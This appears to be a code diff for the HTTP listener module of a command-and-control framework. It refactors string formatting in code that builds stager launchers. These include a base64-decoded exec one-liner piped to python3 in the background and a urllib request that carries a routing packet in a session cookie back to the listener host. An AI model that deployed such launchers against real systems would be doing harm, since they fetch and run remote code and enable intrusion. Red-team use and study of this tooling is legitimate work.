@@ -43,7 +43,7 @@ class Listener:
             "Host": {
                 "Description": "Hostname/IP for staging.",
                 "Required": True,
-                "Value": "http://%s" % (helpers.lhost()),
+                "Value": f"http://{helpers.lhost()}",
             },
             "Port": {
                 "Description": "Port for the listener.",
@@ -315,10 +315,7 @@ class Listener:
             b64RoutingPacket = listenerOptions["RoutingPacket"]["Value"]
 
             # add the RC4 packet to a cookie
-            launcherBase += (
-                'o.addheaders=[(\'User-Agent\',UA), ("Cookie", "session=%s")];\n'
-                % (b64RoutingPacket)
-            )
+            launcherBase += f'o.addheaders=[(\'User-Agent\',UA), ("Cookie", "session={b64RoutingPacket}")];\n'
             launcherBase += "import urllib.request;\n"
 
             if proxy.lower() != "none":
@@ -377,10 +374,7 @@ class Listener:
                 )
                 if isinstance(launchEncoded, bytes):
                     launchEncoded = launchEncoded.decode("UTF-8")
-                launcher = (
-                    "echo \"import sys,base64;exec(base64.b64decode('%s'));\" | python3 &"
-                    % (launchEncoded)
-                )
+                launcher = f"echo \"import sys,base64;exec(base64.b64decode('{launchEncoded}'));\" | python3 &"
                 return launcher
             else:
                 return launcherBase
